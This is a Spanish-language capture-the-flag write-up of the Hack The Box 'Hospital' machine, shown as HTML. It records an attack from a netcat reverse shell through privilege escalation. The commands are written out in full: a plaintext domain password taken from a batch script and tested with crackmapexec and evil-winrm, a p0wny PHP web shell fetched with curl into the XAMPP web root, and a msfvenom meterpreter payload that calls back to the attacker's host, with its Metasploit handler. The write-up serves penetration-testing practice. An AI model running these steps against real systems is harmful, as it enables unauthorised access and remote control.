<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.241] 6171
Microsoft Windows <span class="o">[</span>Version 10.0.17763.4974]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;whoami
<span class="nb">whoami
</span>hospital<span class="se">\d</span>rbrown

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="usertxt">User.txt</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;type C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
9094302029572892e53320578b26c0b0
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>En el directorio de <code class="language-plaintext highlighter-rouge">Documents</code> podemos ver que allí se encuentra el <code class="language-plaintext highlighter-rouge">.bat</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments

05/12/2024  12:36 AM    &lt;DIR&gt;          <span class="nb">.</span>
05/12/2024  12:36 AM    &lt;DIR&gt;          ..
10/23/2023  03:33 PM               373 ghostscript.bat
05/12/2024  12:36 AM            28,160 nc.exe
               2 File<span class="o">(</span>s<span class="o">)</span>         28,533 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   4,184,203,264 bytes free

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;type ghostscript.bat
<span class="nb">type </span>ghostscript.bat
@echo off
<span class="nb">set </span><span class="nv">filename</span><span class="o">=</span>%~1
powershell <span class="nt">-command</span> <span class="s2">"</span><span class="nv">$p</span><span class="s2"> = convertto-securestring 'chr!</span><span class="nv">$br0wn</span><span class="s2">' -asplain -force;</span><span class="nv">$c</span><span class="s2"> = new-object system.management.automation.pscredential('hospital</span><span class="se">\d</span><span class="s2">rbrown', </span><span class="nv">$p</span><span class="s2">);Invoke-Command -ComputerName dc -Credential </span><span class="nv">$c</span><span class="s2"> -ScriptBlock { cmd.exe /c "</span>C:<span class="se">\P</span>rogram<span class="sb">`</span> Files<span class="se">\g</span>s<span class="se">\g</span>s10.01.1<span class="se">\b</span><span class="k">in</span><span class="se">\g</span>swin64c.exe<span class="s2">" -dNOSAFER "</span>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ownloads<span class="se">\%</span>filename%<span class="s2">" }"</span>
C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Tenemos la credencial del <code class="language-plaintext highlighter-rouge">Dr.Brown:chr!$br0wn</code> vamos a validarlas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ cme smb 10.10.11.241 <span class="nt">-u</span> <span class="s1">'drbrown'</span> <span class="nt">-p</span> <span class="s1">'chr!$br0wn'</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span>+] hospital.htb<span class="se">\d</span>rbrown:chr!<span class="nv">$br0wn</span>
</code></pre></div></div>

<ul>
  <li>Podemos usar evil-winrm para mas comodo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme winrm 10.10.11.241 <span class="nt">-u</span> <span class="s1">'drbrown'</span> <span class="nt">-p</span> <span class="s1">'chr!$br0wn'</span>
SMB         10.10.11.241    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span>
HTTP        10.10.11.241    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.241:5985/wsman
WINRM       10.10.11.241    5985   DC               <span class="o">[</span>+] hospital.htb<span class="se">\d</span>rbrown:chr!<span class="nv">$br0wn</span> <span class="o">(</span>Pwn3d!<span class="o">)</span>

➜  content evil-winrm <span class="nt">-i</span> 10.10.11.241 <span class="nt">-u</span> <span class="s1">'drbrown'</span> <span class="nt">-p</span> <span class="s1">'chr!$br0wn'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>hospital<span class="se">\d</span>rbrown
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Si probamos el <code class="language-plaintext highlighter-rouge">winpeas</code> <a href="https://github.com/peass-ng/PEASS-ng/releases">https://github.com/peass-ng/PEASS-ng/releases</a> al ejecutar esto encontramos lo siguiente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications <span class="nt">--Via</span> Program Files/Uninstall registry--
È Check <span class="k">if </span>you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software
    C:<span class="se">\P</span>rogram Files<span class="se">\C</span>ommon Files
    C:<span class="se">\P</span>rogram Files<span class="se">\d</span>esktop.ini
    C:<span class="se">\P</span>rogram Files<span class="se">\d</span>otnet
    C:<span class="se">\P</span>rogram Files<span class="se">\G</span>oogle
    C:<span class="se">\P</span>rogram Files<span class="se">\g</span>s
    C:<span class="se">\P</span>rogram Files<span class="se">\H</span>yper-V
    C:<span class="se">\P</span>rogram Files<span class="se">\i</span>nternet explorer
    C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft
    C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft UCMA 4.0
    C:<span class="se">\P</span>rogram Files<span class="se">\M</span>SBuild
    C:<span class="se">\P</span>rogram Files<span class="se">\P</span>ackageManagement
    C:<span class="se">\P</span>rogram Files<span class="se">\P</span>uTTY
    C:<span class="se">\P</span>rogram Files<span class="se">\P</span>ython312
    C:<span class="se">\P</span>rogram Files<span class="se">\R</span>eference Assemblies
    C:<span class="se">\P</span>rogram Files<span class="se">\U</span>ninstall Information
    C:<span class="se">\P</span>rogram Files<span class="se">\V</span>Mware
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender Advanced Threat Protection
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Identity Foundation
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Mail
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Media Player
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Multimedia Platform
    C:<span class="se">\P</span>rogram Files<span class="se">\w</span>indows nt
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Photo Viewer
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Portable Devices
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Security
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Sidebar
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsApps
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsPowerShell
    C:<span class="se">\x</span>ampp<span class="o">(</span>Users <span class="o">[</span>AppendData/CreateDirectories WriteData/CreateFiles]<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>El <code class="language-plaintext highlighter-rouge">AppendData</code> significa que podemos añadir datos o archivos o crear directorios dentro de la carpeta especificada y <code class="language-plaintext highlighter-rouge">WriteData/CreateFiles</code> nos permite escribir datos en archivos existentes o crear nuevos archivos dentro del directorio como es común en aplicaciones web o servidores que se gestionan a través de <code class="language-plaintext highlighter-rouge">XAMPP</code>. En este caso, <code class="language-plaintext highlighter-rouge">XAMPP</code>, que es un paquete que incluye <code class="language-plaintext highlighter-rouge">Apache</code>, <code class="language-plaintext highlighter-rouge">MySQL</code>, y otros componentes para servidores web, necesitaría estos permisos para operar correctamente y permitir al usuario administrar sitios web, bases de datos, y otros servicios relacionados.</p>
  </li>
  <li>
    <p>Si entramos en <code class="language-plaintext highlighter-rouge">htdocs</code> encontramos archivos de configuración.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp&gt; <span class="nb">cd </span>htdocs
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----       10/22/2023  10:19 PM                bin
d-----       10/22/2023  11:47 PM                config
d-----       10/22/2023  10:33 PM                default
d-----       10/22/2023  10:19 PM                installer
d-----       10/22/2023  10:32 PM                logs
d-----       10/22/2023  10:19 PM                plugins
d-----       10/22/2023  10:20 PM                program
d-----       10/22/2023  10:20 PM                skins
d-----       10/22/2023  10:19 PM                SQL
d-----        5/12/2024  12:41 AM                temp
d-----       10/22/2023  10:20 PM                vendor
<span class="nt">-a----</span>       10/16/2023  12:23 PM           2553 .htaccess
<span class="nt">-a----</span>       10/16/2023  12:23 PM         211743 CHANGELOG.md
<span class="nt">-a----</span>       10/16/2023  12:23 PM            994 composer.json
<span class="nt">-a----</span>       10/16/2023  12:23 PM           1086 composer.json-dist
<span class="nt">-a----</span>       10/16/2023  12:23 PM          56279 composer.lock
<span class="nt">-a----</span>       10/16/2023  12:23 PM          11199 index.php
<span class="nt">-a----</span>       10/16/2023  12:23 PM          12661 INSTALL
<span class="nt">-a----</span>       10/16/2023  12:23 PM          35147 LICENSE
<span class="nt">-a----</span>       10/16/2023  12:23 PM           3853 README.md
<span class="nt">-a----</span>       10/16/2023  12:23 PM            967 SECURITY.md
<span class="nt">-a----</span>       10/16/2023  12:23 PM           4657 UPGRADING


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt;
</code></pre></div></div>

<ul>
  <li>Si vemos los permisos establecidos para la carpeta los permisos indican que las cuentas de servicio del sistema y los administradores tienen acceso completo, mientras que los usuarios normales tienen permisos más limitados de lectura y ejecución, con capacidades específicas para añadir o borrar datos. Esto es típico en entornos donde se necesita limitar el acceso de los usuarios comunes para prevenir cambios no autorizados en aplicaciones críticas como las que se manejan a través de XAMPP.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp&gt; icacls htdocs
htdocs NT AUTHORITY<span class="se">\L</span>OCAL SERVICE:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
       NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
       BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
       BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>RX<span class="o">)</span>
       BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>AD<span class="o">)</span>
       BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>WD<span class="o">)</span>
       CREATOR OWNER:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>

Successfully processed 1 files<span class="p">;</span> Failed processing 0 files
</code></pre></div></div>

<ul>
  <li>Podemos añadir y escribir en la carpeta si queremos ganar acceso rápido lo que podemos hacer es subir el <a href="https://github.com/flozz/p0wny-shell">https://github.com/flozz/p0wny-shell</a> .</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  p0wny-shell git:<span class="o">(</span>master<span class="o">)</span> python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.241 - - <span class="o">[</span>11/May/2024 19:12:01] <span class="s2">"GET /shell.php HTTP/1.1"</span> 200 -
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; curl <span class="nt">-o</span> shell.php http://10.10.14.71:80/shell.php
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----       10/22/2023  10:19 PM                bin
d-----       10/22/2023  11:47 PM                config
d-----       10/22/2023  10:33 PM                default
d-----       10/22/2023  10:19 PM                installer
d-----       10/22/2023  10:32 PM                logs
d-----       10/22/2023  10:19 PM                plugins
d-----       10/22/2023  10:20 PM                program
d-----       10/22/2023  10:20 PM                skins
d-----       10/22/2023  10:19 PM                SQL
d-----        5/12/2024  12:41 AM                temp
d-----       10/22/2023  10:20 PM                vendor
<span class="nt">-a----</span>       10/16/2023  12:23 PM           2553 .htaccess
<span class="nt">-a----</span>       10/16/2023  12:23 PM         211743 CHANGELOG.md
<span class="nt">-a----</span>       10/16/2023  12:23 PM            994 composer.json
<span class="nt">-a----</span>       10/16/2023  12:23 PM           1086 composer.json-dist
<span class="nt">-a----</span>       10/16/2023  12:23 PM          56279 composer.lock
<span class="nt">-a----</span>       10/16/2023  12:23 PM          11199 index.php
<span class="nt">-a----</span>       10/16/2023  12:23 PM          12661 INSTALL
<span class="nt">-a----</span>       10/16/2023  12:23 PM          35147 LICENSE
<span class="nt">-a----</span>       10/16/2023  12:23 PM           3853 README.md
<span class="nt">-a----</span>       10/16/2023  12:23 PM            967 SECURITY.md
<span class="nt">-a----</span>        5/12/2024   1:12 AM          20321 shell.php
<span class="nt">-a----</span>       10/16/2023  12:23 PM           4657 UPGRADING


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt;
</code></pre></div></div>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Ya podemos leer la flag.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/15.png" />
</p>

<h2 id="la-otra-forma-de-escalar-privilegios">La otra forma de escalar privilegios</h2>

<ul>
  <li>En esta maquina existe otra forma de escalar privilegios si vemos las sesiones activas en el sistema vemos que hay una sesión activa por el doctor cada usuario corre tareas o servicios del sistema para enumerarlos vamos a usar <code class="language-plaintext highlighter-rouge">Metasploit</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
<span class="o">&gt;</span>services                                    0  Disc
 console           drbrown                   1  Active
 rdp-tcp                                 65536  Listen
</code></pre></div></div>

<ul>
  <li>Lo primero que vamos a hacer ejecutarnos un <code class="language-plaintext highlighter-rouge">.exe</code> para ganar acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.71 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="o">&gt;</span> shell.exe
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
</code></pre></div></div>

<ul>
  <li>Ahora lo subimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt; upload shell.exe

Info: Uploading /home/miguel/Hackthebox/Hospital/content/shell.exe to C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop<span class="se">\s</span>hell.exe

Data: 9556 bytes of 9556 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<ul>
  <li>Iniciamos <code class="language-plaintext highlighter-rouge">Metasploit</code> y preparamos todo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfconsole
Metasploit tip: Use <span class="nb">help</span> &lt;<span class="nb">command</span><span class="o">&gt;</span> to learn more about any <span class="nb">command</span>

  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  <span class="o">==</span>c<span class="o">(</span>______<span class="o">(</span>o<span class="o">(</span>______<span class="o">(</span>_<span class="o">()</span>  | |<span class="s2">""""""""""""</span>|<span class="o">======[</span><span class="k">***</span>  |
  |             <span class="o">)=</span><span class="se">\ </span>          | |  EXPLOIT   <span class="se">\ </span>           |
  |            // <span class="se">\\</span>          | |_____________<span class="se">\_</span>______    |
  |           //   <span class="se">\\</span>         | |<span class="o">==[</span>msf <span class="o">&gt;]============</span><span class="se">\ </span>  |
  |          //     <span class="se">\\</span>        | |______________________<span class="se">\ </span> |
  |         // RECON <span class="se">\\</span>       | <span class="se">\(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)</span>/   |
  |        //         <span class="se">\\</span>      |  <span class="k">*********************</span>    |
  +---------------------------+---------------------------+
  |      o O o                |        <span class="se">\'\/\/\/</span><span class="s1">'/         |
  |              o O          |         )======(          |
  |                 o         |       .'</span>  LOOT  <span class="s1">'.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '</span><span class="nt">--------------</span><span class="s1">'      |
  +---------------------------+---------------------------+


       =[ metasploit v6.4.2-dev                           ]
+ -- --=[ 2408 exploits - 1240 auxiliary - 422 post       ]
+ -- --=[ 1465 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 &gt; use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set lhost 10.10.14.71
lhost =&gt; 10.10.14.71
msf6 exploit(multi/handler) &gt; set lport 443
lport =&gt; 443
msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 10.10.14.71:443
</span></code></pre></div></div>

<ul>
  <li>Ahora ejecutamos el <code class="language-plaintext highlighter-rouge">.exe</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt; .<span class="se">\s</span>hell.exe
</code></pre></div></div>

<ul>
  <li>Ahora ya obtenemos una conexión, vamos a ver los procesos que se están corriendo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> ps

Process List
<span class="o">============</span>

 PID   PPID  Name       Arch  Session  User            Path
 <span class="nt">---</span>   <span class="nt">----</span>  <span class="nt">----</span>       <span class="nt">----</span>  <span class="nt">-------</span>  <span class="nt">----</span>            <span class="nt">----</span>
 0     0     <span class="o">[</span>System P
             rocess]
 4     0     System
 48    4     Secure Sy
             stem
 92    4     Registry
 336   4     smss.exe
 364   656   svchost.e
             xe
 368   656   svchost.e
             xe
 380   656   svchost.e
             xe
 416   408   csrss.exe
 516   616   dwm.exe
 520   408   wininit.e
             xe
 528   512   csrss.exe
 616   512   winlogon.
             exe
 656   520   services.
             exe
 676   520   LsaIso.ex
             e
 684   520   lsass.exe
 784   656   svchost.e
             xe
 852   656   VGAuthSer
             vice.exe
 892   656   svchost.e
             xe
 900   656   svchost.e
             xe
 912   656   svchost.e
             xe
 952   656   svchost.e
             xe
 996   656   svchost.e
             xe
 1016  656   svchost.e
             xe
 1052  656   svchost.e
             xe
 1072  656   svchost.e
             xe
 1116  656   svchost.e
             xe
 1164  656   svchost.e
             xe
 1244  656   svchost.e
             xe
 1276  656   svchost.e
             xe
 1304  656   svchost.e
             xe
 1324  656   svchost.e  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             xe                        wn              em32<span class="se">\s</span>vchost.ex
                                                       e
 1336  656   svchost.e
             xe
 1408  656   svchost.e
             xe
 1416  656   svchost.e
             xe
 1452  656   svchost.e
             xe
 1520  656   svchost.e
             xe
 1540  656   svchost.e
             xe
 1548  656   svchost.e
             xe
 1616  656   svchost.e
             xe
 1624  656   svchost.e
             xe
 1752  656   svchost.e
             xe
 1760  656   svchost.e
             xe
 1780  656   svchost.e
             xe
 1792  656   svchost.e
             xe
 1856  656   svchost.e
             xe
 1900  656   svchost.e
             xe
 1924  656   svchost.e
             xe
 2060  656   svchost.e
             xe
 2096  656   svchost.e
             xe
 2116  656   svchost.e
             xe
 2124  656   svchost.e
             xe
 2424  656   SMSvcHost
             .exe
 2464  656   svchost.e
             xe
 2564  656   svchost.e
             xe
 2700  616   fontdrvho
             st.exe
 2708  520   fontdrvho
             st.exe
 2748  656   svchost.e
             xe
 2768  656   svchost.e
             xe
 2776  656   httpd.exe
 2784  656   Microsoft
             .ActiveDi
             rectory.W
             ebService
             s.exe
 2796  656   svchost.e
             xe
 2808  656   svchost.e
             xe
 2852  656   dfsrs.exe
 2904  656   svchost.e
             xe
 2924  656   dns.exe
 2948  656   hMailServ
             er.exe
 2960  656   svchost.e
             xe
 2984  656   mysqld.ex
             e
 3008  656   svchost.e
             xe
 3020  656   ismserv.e
             xe
 3028  656   mqsvc.exe
 3060  656   svchost.e
             xe
 3068  7396  python.ex  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
             e                         wn              s<span class="se">\P</span>ython312<span class="se">\p</span>yt
                                                       hon.exe
 3108  656   svchost.e
             xe
 3120  656   dfssvc.ex
             e
 3140  2124  sihost.ex  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             e                         wn              em32<span class="se">\s</span>ihost.exe
 3144  656   vmtoolsd.
             exe
 3192  656   svchost.e
             xe
 3236  656   vmms.exe
 3244  656   vm3dservi
             ce.exe
 3292  656   svchost.e
             xe
 3308  656   svchost.e
             xe
 3316  656   svchost.e
             xe
 3532  656   svchost.e
             xe
 3572  3244  vm3dservi
             ce.exe
 3888  656   vds.exe
 4116  912   wsmprovho  x64   0        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             st.exe                    wn              em32<span class="se">\w</span>smprovhos
                                                       t.exe
 4156  2776  httpd.exe
 5208  656   dllhost.e
             xe
 5276  912   WmiPrvSE.
             exe
 5468  656   SMSvcHost
             .exe
 5528  656   vmcompute
             .exe
 5792  656   svchost.e
             xe
 6040  912   ShellExpe  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             rienceHos                 wn              emApps<span class="se">\S</span>hellExp
             t.exe                                     erienceHost_cw5
                                                       n1h2txyewy<span class="se">\S</span>hel
                                                       lExperienceHost
                                                       .exe
 6084  656   msdtc.exe
 6188  6444  explorer.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\e</span>xpl
             exe                       wn              orer.exe
 6256  3068  IEDriverS  x86   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\U</span>sers<span class="se">\d</span>rbrow
             erver.exe                 wn              n.HOSPITAL<span class="se">\.</span>cac
                                                       he<span class="se">\s</span>elenium<span class="se">\I</span>ED
                                                       riverServer<span class="se">\w</span><span class="k">in
                                                       </span>32<span class="se">\4</span>.14.0<span class="se">\I</span>EDri
                                                       verServer.exe
 6308  7396  conhost.e  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             xe                        wn              em32<span class="se">\c</span>onhost.ex
                                                       e
 6728  1540  taskhostw  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             .exe                      wn              em32<span class="se">\t</span>askhostw.
                                                       exe
 6756  4116  shell.exe  x64   0        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\U</span>sers<span class="se">\d</span>rbrow
                                       wn              n.HOSPITAL<span class="se">\D</span>esk
                                                       top<span class="se">\s</span>hell.exe
 6816  656   svchost.e  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             xe                        wn              em32<span class="se">\s</span>vchost.ex
                                                       e
 6920  6964  ctfmon.ex  x64   1
             e
 6924  912   SearchUI.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             exe                       wn              emApps<span class="se">\M</span>icrosof
                                                       t.Windows.Corta
                                                       na_cw5n1h2txyew
                                                       y<span class="se">\S</span>earchUI.exe
 6964  656   svchost.e
             xe
 7248  912   RuntimeBr  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             oker.exe                  wn              em32<span class="se">\R</span>untimeBro
                                                       ker.exe
 7264  656   svchost.e
             xe
